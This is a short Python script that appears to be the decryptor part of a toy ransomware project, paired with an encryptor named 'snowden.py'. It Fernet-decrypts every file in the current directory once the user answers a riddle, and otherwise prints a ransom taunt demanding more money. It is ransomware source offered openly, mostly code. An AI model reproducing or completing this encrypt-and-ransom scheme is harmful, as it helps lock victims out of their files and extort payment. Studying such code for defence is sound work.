#!/usr/bin/env python3 


import os 
from cryptography.fernet import Fernet 

#lets do some digging 


files = []


for file in  os.listdir():
	if file == "snowden.py" or file == "keyhehe.key" or file == "decryptt.py":
		continue 
	if os.path.isfile(file):
	 	files.append(file)
print(files)

with open("keyhehe.key", "rb") as key:
	secretkey = key.read()

secretphrase = "cloud"

print("Answer The Riddle To Decrypt The Files\n")
user_phrase = input("I can fly but have no wings. I can cry but I have no eyes. Wherever I go darkness follows me. What am I?\n")

if user_phrase == secretphrase:
	for file in files:
		with open(file, "rb") as filehehe:
			contents = filehehe.read()
		contents_decrypted = Fernet(secretkey).decrypt(contents)
		with open(file, "wb") as filehehe:
			filehehe.write(contents_decrypted)

	print("Congrats pal, your files have been decrypted")
else:
	print("BAMM SUCKER SEND ME MORE MONEY")
